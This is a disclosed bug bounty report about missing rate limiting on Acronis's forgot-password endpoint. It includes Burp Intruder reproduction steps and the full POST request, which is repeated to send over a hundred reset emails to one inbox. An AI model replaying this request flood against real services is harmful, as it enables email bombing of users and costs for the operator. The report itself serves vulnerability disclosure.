# No Rate Limit On Forgot Password Page

## Report Details
- **Report ID**: 1245529
- **URL**: https://hackerone.com/reports/1245529
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2021-06-27T06:08:22.039Z
- **Disclosed**: 2021-07-09T13:25:32.949Z

## Reporter
- **Username**: bcbc04131e9a7775cc46c97
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: acronis

## Vulnerability Information
## Summary
A little bit about Rate Limit:
A rate limiting algorithm is used to check if the user session (or IP-address) has to be limited based on the information in the session cache.
In case a client made too many requests within a given time frame, HTTP-Servers can respond with status code 429: Too Many Requests.


## Steps To Reproduce
[add details for how we can reproduce the issue]
 
Visit https://account.acronis.com/
Login and then click on forgot password 
Enter your mail and click on Forgot Password

Step 2- Intercept This Request In Burp And Forward Till You Found Your NumberStep 3- Now Send This Request To Intruder And Repeat It as many as time By Fixing Any Arbitrary Payload Which Doesn't No Effect Request I Choose Accept-Language: en-US,en;q=0.$9$

POST /v2/auth/password/reset HTTP/1.1
Host: account.acronis.com
Connection: close
Content-Length: 36
Accept: application/json, text/plain, */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36
Content-Type: application/json;charset=UTF-8
Origin: https://account.acronis.com
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://account.acronis.com/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: _ga=GA1.2.1812368333.1624773555; _gid=GA1.2.1077432380.1624773555; _gat_UA-149943-47=1

{"email":"fexec99607@paseacuba.com"}

Step 3- Now Send This Request To Intruder And Repeat It as many as time By Fixing Any Arbitrary Payload Which Doesn't No Effect Request I Choose Accept-Language: en-US,en;q=0.$9$

POST /v2/auth/password/reset HTTP/1.1
Host: account.acronis.com
Connection: close
Content-Length: 36
Accept: application/json, text/plain, */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36
Content-Type: application/json;charset=UTF-8
Origin: https://account.acronis.com
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://account.acronis.com/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.$9$
Cookie: _ga=GA1.2.1812368333.1624773555; _gid=GA1.2.1077432380.1624773555; _gat_UA-149943-47=1

{"email":"fexec99607@paseacuba.com"}

Step 4 - See You Will Get 200, 204 ok Status Code & 100 + Email In Your INBOX
See It Is Resulting In Mass Mailing Or Email Bombing To Your Users Which Is Bad For Business Impact.

## Impact

If You Are Using Any Email Service Software API Or Some Tool Which Costs You For Your Email This Type Of Attack Can Result in You In Financial Lose And It Can Also Slow Down Your Services It Can Take Bulk Of Storage In Sent Mail Although If Users Are Affected By This Vulnerability They Can Stop Using Your Services Which Can Lead To Business Risk

## Attachments
- Capture.PNG
- bandicam_2021-06-27_11-29-32-427.mp4
- bandicam_2021-06-27_11-37-32-330.mp4
